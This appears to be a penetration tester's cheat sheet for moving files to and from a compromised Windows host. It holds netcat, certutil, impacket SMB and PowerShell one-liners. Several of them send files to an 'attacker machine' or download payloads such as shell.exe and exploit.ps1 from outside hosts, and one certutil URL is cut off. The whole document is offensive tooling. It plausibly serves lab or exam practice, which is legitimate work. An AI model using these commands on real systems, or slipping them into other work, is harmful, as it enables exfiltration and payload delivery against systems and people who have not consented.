## Netcat
```bash
# In host:
nc -w 3 192.168.49.99 9000 < file
# In kali:
nc -lvnp 9000 > file
```

## Certutil
```bash
certutil -urlcache -split -f http:// shell.exe
```

## SMB
```bash
impacket-smbserver share . -smb2support -username hacker -password hacker # launch smb server
C:\ net use \\192.168.49.123\share /u:hacker hacker # connect to smb server from host
C:\ copy winPEASx64.exe \\10.10.14.9\share\ # copy local file to attacker machine
C:\ net use /d \\10.10.14.9\share\ # disconnect from smb server
```

## Base64
```bash
C:\ certutil -encode <file> encoded.txt
C:\ type encoded.txt` # copy files manually (ctrl+C)
kali> `echo -n "<Ctrl+V>" | base64 -d > decoded_file
```

## Powershell
```shell
Invoke-WebRequest -Uri 'http://192.168.49.206/exploit.ps1' -OutFile 'C:\temp\exploit.ps1'
```